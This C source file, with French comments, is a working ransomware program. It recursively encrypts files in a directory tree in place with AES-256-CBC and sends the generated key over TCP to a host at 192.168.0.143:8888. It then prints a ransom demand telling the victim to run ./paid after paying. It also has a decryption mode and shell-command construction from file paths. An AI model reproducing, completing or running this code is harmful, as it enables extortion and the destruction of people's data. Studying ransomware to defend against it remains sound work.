#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <math.h>
#include <string.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <time.h>
#include <arpa/inet.h>
#include <string.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>


#define MAXBYTE 8796093022208
#define BLOCK_SIZE 16

int aes_encrypt(FILE *in, FILE *out, const unsigned char *key, const unsigned char *iv){

    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();
    if ((EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) != 1){
        printf("erreur de evp init :chiffrement\n");
    }

    // Encrypt the data
    unsigned char in_buffer[EVP_MAX_BLOCK_LENGTH];
    unsigned char out_buffer[EVP_MAX_BLOCK_LENGTH];
    int in_len;
    int out_len;
    while ((in_len = fread(in_buffer, 1, BLOCK_SIZE, in)) >0 ) {
        if ((EVP_EncryptUpdate(ctx, out_buffer, &out_len, in_buffer, in_len)) != 1){
            printf("erreur de evp update :chiffrement\n");
        }
        if ((fwrite(out_buffer, 1, out_len, out)) != (size_t)out_len){
            printf("erreur de fwrite après evp update : chiffrement\n");
        }
    }
    int rest_len;
    if ((EVP_EncryptFinal_ex(ctx, out_buffer, &rest_len)) != 1){
        printf("erreur de evp final :chiffrement\n");
    }

    if((fwrite(out_buffer, 1, rest_len, out)) != (size_t)rest_len){
        printf("erreur de fwrite après evp final : chiffrement\n");
    }
    EVP_CIPHER_CTX_free(ctx);
    return 0;
}

int aes_decrypt(FILE *in, FILE *out, const unsigned char *key, const unsigned char *iv){

    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new();
    if ((EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv)) != 1){
        printf("erreur de evp init :déchiffrement\n");
    };

    // Encrypt the data
    unsigned char in_buffer[EVP_MAX_BLOCK_LENGTH];
    unsigned char out_buffer[EVP_MAX_BLOCK_LENGTH];
    int in_len;
    int out_len;
    while ((in_len = fread(in_buffer, 1, BLOCK_SIZE, in)) >0 ) {
        if ((EVP_DecryptUpdate(ctx, out_buffer, &out_len, in_buffer, in_len)) != 1){
            printf("erreur de evp update :déchiffrement\n");
        }
        if ((fwrite(out_buffer, 1, out_len, out)) != (size_t)out_len){
            printf("erreur de fwrite après evp update : déchiffrement\n");
        }
    }
    int rest_len;
    if ((EVP_DecryptFinal_ex(ctx, out_buffer, &rest_len)) != 1){
        printf("erreur de evp final :déchiffrement\n");
    }

    if((fwrite(out_buffer, 1, rest_len, out)) != (size_t)rest_len){
        printf("erreur de fwrite après evp final :déchiffrement\n");
    }
    EVP_CIPHER_CTX_free(ctx);
    return 0;

}

int stat_file(const char* name){
    struct stat stat_file;
    stat(name, &stat_file);
    int size = stat_file.st_size;
    printf("file size: %d\n", size);
    if (size >=MAXBYTE){
        return 1;
    }
    else{
        return 0;
    }
}

int extension_file(const char* name){
    const char* ext = strrchr(name, '.'); /*prend la dernière occurence de '.' */
    if(!ext){

    }
    else{
        printf("extension is %s\n", ext +1); /* comprendre ext +1*/
        if (strcmp((ext +1), "mp3") == 0 || strcmp((ext +1), "mp4") == 0){
            return 1;
            printf("ici \n");
        }
        else{
            return 0;
        }
    }

}

int encrypt(char* path, const unsigned char *key, const unsigned char *iv){
    // Ouvrir les fichiers en lecture et écriture
    FILE *in_file = fopen(path, "rb");
    FILE *out_file = fopen("./output.txt", "wb");

    // Vérifier si les fichiers ont bien été ouverts
    if (in_file == NULL || out_file == NULL) {
        printf("erreur d'ouverture de fichier pour le chiffrement\n");
        return 1;
    }
    aes_encrypt(in_file, out_file, key, iv);
    fclose(in_file);
    fclose(out_file);
    char *command = malloc(100* sizeof(char));
    sprintf(command, "cp ./output.txt %s",path);
    system(command);
    system("rm output.txt");
    free(command);


}

int decrypt(char* path, const unsigned char *key, const unsigned char *iv){
    FILE *in_file = fopen(path, "rb");
    FILE *out_file = fopen("output.txt", "wb");
    if (in_file == NULL || out_file == NULL) {
        printf("erreur d'ouverture de fichier pour le déchiffrement\n");
        return 1;
    }
    aes_decrypt(in_file, out_file, key, iv);
    fclose(in_file);
    fclose(out_file);
    char *command = malloc(100* sizeof(char));
    sprintf(command, "cp ./output.txt %s",path);
    system(command);
    system("rm output.txt");
    free(command);

}

int ls(char* name, const unsigned char *key, const unsigned char *iv, char *ending){
    DIR* dir = opendir(name);
    printf("Reading files in: %s\n", name);
    if (dir == NULL){
        return 1;
    }
    struct dirent* entity;
    entity = readdir(dir);
    while(entity != NULL ){
        printf("%d %s\n", entity->d_type , entity->d_name);
        /* problème gestion d_type, ne donne que 8 et 4 et pas le reste*/
        if (entity->d_type == DT_DIR && strcmp(entity->d_name, ".") != 0 && strcmp(entity->d_name, "..") != 0){
            char path[100] = {0};    /*Peut-être une alocation dynamique si possible*/
            strcat(path, name);
            strcat(path, "/");
            strcat(path, entity->d_name);
            ls(path, key, iv, ending);
        }
        else{
            if (strcmp(entity->d_name, ".") != 0 && strcmp(entity->d_name, "..") != 0){
                int rule1 = stat_file(entity->d_name);
                int rule2 = extension_file(entity->d_name);
                printf("respet des regles %d %d \n", rule1, rule2);
                if(rule1 == 0 && rule2 == 0 ){
                    char file_path[100] = {0};
                    strcat(file_path, name);
                    strcat(file_path, "/");
                    strcat(file_path, entity->d_name);
                    if(strcmp(ending, "1") == 0){
                        encrypt(file_path, key, iv);
                    }
                    if(strcmp(ending, "2") == 0){
                        decrypt(file_path, key, iv);
                    }
                }
            }
        }
        entity = readdir(dir);
    }
    closedir(dir);
    return 0;
}


int main(int argc, char *argv[]){
    unsigned char key[32];
    if(strcmp(argv[2], "1") == 0){
        if (!RAND_bytes(key, sizeof(key))) {
            printf("bug de generation de la cle\n");
            return 1;
        }
    }
    else{
        char *p = strtok(argv[3], ", ");
        int i =0;
        while (p != NULL) {
            key[i] = strtol(p, NULL, 16);
            p = strtok(NULL, ", ");
            i++;
        }

    }
    unsigned char iv[16];
    if(strcmp(argv[2], "1") == 0){
        if (!RAND_bytes(iv, sizeof(iv))) {
            printf("bug de generation du vecteur\n");
            return 1;
        }
    }else{
        char *p = strtok(argv[4], ", ");
        int i =0;
        while (p != NULL) {
            iv[i] = strtol(p, NULL, 16);
            p = strtok(NULL, ", ");
            i++;
        }
    }


    ls(argv[1], key, iv, argv[2]);

    char *registers = malloc(100* sizeof(char));
    sprintf(registers, "0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x", iv[0], iv[1], iv[2], iv[3], iv[4], iv[5], iv[6], iv[7], iv[8], iv[9], iv[10], iv[11], iv[12], iv[13], iv[14], iv[15]);
    FILE *iv_file = fopen(".iv", "w");
    if (iv_file == NULL) {
        printf("erreur d'ouverture de fichier iv\n");
        return 1;
    }
    fprintf(iv_file, registers);
    fclose(iv_file);
    free(registers);

    printf("\n");
    printf("\n");
    printf("\n");
    printf("\n");

    char *registers2 = malloc(200* sizeof(char));
    sprintf(registers2, "0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x,0x%x", key[0], key[1],key[2],key[3],key[4],key[5], key[6],key[7],key[8],key[9],key[10], key[11],key[12],key[13],key[14],key[15], key[16],key[17],key[18],key[19],key[20], key[21],key[22],key[23],key[24],key[25], key[26],key[27],key[28],key[29],key[30],key[31]);

    int sockid;
    int server_port = 8888;
    char *server_ip = "192.168.0.143";

    sockid = socket(AF_INET, SOCK_STREAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    if(connect(sockid,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0){
        printf("Erreur lors de la connection");
        exit(1);
    }
    send(sockid,(const char *)registers2,strlen(registers2),0);
    close(sockid);
    printf("Lorsque vous avez payé la rançon lancez executez le programme ./paid la clé de déchiffrage vous sera donnée dans l'heure");

    free(registers2);

}
